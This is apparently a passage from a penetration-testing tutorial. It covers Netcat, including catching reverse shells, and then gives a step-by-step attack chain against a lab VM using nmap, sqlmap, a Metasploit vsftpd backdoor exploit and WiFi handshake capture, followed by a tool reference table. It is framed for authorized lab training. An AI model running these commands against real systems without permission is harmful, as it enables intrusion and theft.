Netcat is often called the **Swiss Army knife of networking**. At its core it creates raw TCP/UDP connections between machines. Think of it as a **plain telephone line** — no encryption, no protocol overhead, just raw data transfer. It can act as a client, a server, a port scanner, a file transfer tool, and a backdoor listener all in one.

### Install
```bash
sudo apt install netcat-traditional
# or
sudo apt install ncat   # the nmap version, more features
```

### Common Uses

```bash
# Simple connection test (like ping but for ports)
nc -v 192.168.1.1 80

# Listen on a port (act as server)
nc -lvp 4444

# Connect to a listener
nc 192.168.1.25 4444

# Transfer a file
# Receiver (run first):
nc -lvp 4444 > received_file.txt
# Sender:
nc 192.168.1.25 4444 < file_to_send.txt

# Banner grabbing (identify what service is running)
echo "" | nc -v 192.168.1.1 22

# Simple chat between two machines
# Machine 1: nc -lvp 4444
# Machine 2: nc 192.168.1.X 4444
# Now type — it appears on both screens

# Port scanner (basic)
nc -zv 192.168.1.1 1-1000
```

### Catching Reverse Shells

When using Metasploit, BeEF, or manual exploits with reverse shells, Netcat is the listener:
```bash
# Listener waiting for incoming connection from victim
nc -lvp 4444
# Once victim executes payload: you get a shell prompt
```

### ⚠️ Important Notes
- Netcat transfers are **completely unencrypted** — visible to anyone intercepting
- Use `ncat --ssl` for encrypted connections
- Some systems come with OpenBSD Netcat which lacks `-e` flag (execute) — install `netcat-traditional` for full functionality

---

## Full Attack Chain Example (Lab Environment Only)

Here's how several tools work together in sequence for a complete penetration test scenario against a test VM like Metasploitable:

```bash
# 1. Discover live hosts
sudo netdiscover -r 192.168.1.0/24

# 2. Port scan the target
sudo nmap -sV -O -T4 192.168.1.100 -oN scan.txt

# 3. Find hidden web directories
dirb http://192.168.1.100

# 4. Scan web app for vulnerabilities
zaproxy    # active scan against http://192.168.1.100

# 5. Test for SQL injection
sqlmap -u "http://192.168.1.100/page.php?id=1" --dbs

# 6. Run a specific exploit via Metasploit
sudo msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit

# 7. Capture and analyze traffic during the attack
sudo wireshark   # filter: ip.addr == 192.168.1.100

# 8. If WiFi testing: start monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
# ... capture handshake ...
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

## Quick Reference Card

| Tool | Phase | Requires Root | Requires Monitor Mode | Effectiveness |
|------|-------|--------------|----------------------|---------------|
| Netdiscover | Recon | ✅ | ❌ | High on local LAN |
| Nmap/Zenmap | Scanning | ✅ (for -O) | ❌ | Very High |
| Maltego | Recon | ❌ | ❌ | High for public targets |
| Knockpy | Recon | ❌ | ❌ | Medium |
| Dirb | Web scan | ❌ | ❌ | High |
| OWASP ZAP | Web scan | ❌ | ❌ | High for web apps |
| SQLmap | Exploitation | ❌ | ❌ | High if SQLi exists |
| Metasploit | Exploitation | ✅ | ❌ | Medium (needs unpatched targets) |
| Nexpose | Vuln assessment | ✅ | ❌ | Very High |
| Bettercap | MITM | ✅ | ❌ | Medium (limited by HTTPS) |
| arpspoof | MITM | ✅ | ❌ | Medium (limited by HTTPS) |
| Wireshark | Analysis | ✅ | ⚠️ Optional | Very High |
| Airmon-ng | WiFi | ✅ | Enables it | — |
| Airodump-ng | WiFi capture | ✅ | ✅ | High |
| Aireplay-ng | WiFi inject | ✅ | ✅ | High |
| Aircrack-ng | WiFi crack | ✅ | ✅ | Low-High (depends on password) |
| Crunch | Wordlists | ❌ | ❌ | Only as good as your pattern |
| Veil | Evasion | ✅ | ❌ | Medium (AV arms race) |
| BeEF | Browser | ✅ | ❌ | Low on modern browsers |
| Evilgrade | Fake updates | ✅ | ❌ | Low on modern software |
| Backdoor Factory | Payload | ✅ | ❌ | Low without AV evasion |
| Netcat | Utility | ❌ | ❌ | Very High as utility |

---

## Recommended Practice Environments

Never test these tools on systems/networks you don't own. Instead:

- **Metasploitable 2/3** — intentionally vulnerable Linux VM
- **DVWA** (Damn Vulnerable Web App) — vulnerable web app
- **HackTheBox** — legal online lab with real challenges  
- **TryHackMe** — guided beginner-friendly labs
- **VulnHub** — downloadable vulnerable VMs
- **Your own home lab** — two VMs on an isolated host-only network

---

*Guide prepared for authorized educational use. Always obtain written permission before testing any system or network you do not personally own.*
